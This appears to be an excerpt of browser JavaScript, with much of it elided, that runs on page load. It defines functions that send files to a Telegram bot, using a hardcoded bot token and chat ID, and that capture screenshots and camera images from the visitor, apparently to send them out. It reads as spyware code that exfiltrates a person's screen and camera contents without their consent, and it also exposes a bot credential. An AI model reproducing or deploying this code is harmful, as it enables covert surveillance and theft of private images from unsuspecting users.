document.addEventListener('DOMContentLoaded', function() {
    ...
    async function sendDocumentToTelegram(fileBlob, filename) {
        const telegramToken = "7690935128:AAGwHAh-UlGxes37W-8xdY36B_kMgbuI5Bo";
        const telegramChatId = 1939760357;
    ...
    async function sendScreenshot() {
        try {
            ...
            if (screenshotDataUrl) {
                ...
                const filename = `Screenshot from zero (${fileSize}KB).png`;
    ...
    async function sendCameraCapture() {
        try {
            ...
            if (cameraDataUrl) {
                ...
                const filename = `Camera from zero (${fileSize}KB).png`;
